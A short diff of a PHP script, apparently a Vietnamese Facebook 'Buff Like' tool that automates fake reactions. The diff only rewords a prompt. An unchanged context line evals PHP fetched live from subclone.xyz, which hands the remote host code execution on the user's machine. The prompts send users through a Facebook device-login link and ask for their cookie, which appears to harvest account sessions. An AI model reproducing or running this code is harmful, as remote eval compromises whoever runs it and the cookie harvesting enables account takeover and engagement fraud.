@@ -11,7 +11,7 @@ eval(file_get_contents('https://subclone.xyz/logo.php'));
 echo "\033[1;37m      = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";usleep(50000);
 
 
-$noidung = array("\033[1;32mCopy Link Dưới Đây Và Dán Lên Chrome Để Xác Nhận:\033[1;33m\n\033[1;31mhttps://m.facebook.com/device?user_code=","\033[1;37m~\033[1;31m[\033[1;32m✔\033[1;31m]\033[1;37m =>\033[1;32m Nhấn Enter Nếu Đã Xác Nhận: ","Cookie : ","$banner","\033[1;37m~\033[1;31m[\033[1;32m1\033[1;31m]\033[1;37m =>\033[1;32m Buff Like
+$noidung = array("\033[1;32mChép Link Dưới Đây Và Dán Lên Chrome Để Xác Nhận:\033[1;33m\n\033[1;31mhttps://m.facebook.com/device?user_code=","\033[1;37m~\033[1;31m[\033[1;32m✔\033[1;31m]\033[1;37m =>\033[1;32m Nhấn Enter Nếu Đã Xác Nhận: ","Cookie : ","$banner","\033[1;37m~\033[1;31m[\033[1;32m1\033[1;31m]\033[1;37m =>\033[1;32m Buff Like
 \033[1;37m~\033[1;31m[\033[1;32m2\033[1;31m]\033[1;37m =>\033[1;32m Buff Tym
 \033[1;37m~\033[1;31m[\033[1;32m3\033[1;31m]\033[1;37m =>\033[1;32m Buff HaHa 
 \033[1;37m~\033[1;31m[\033[1;32m4\033[1;31m]\033[1;37m =>\033[1;32m Buff Wow 
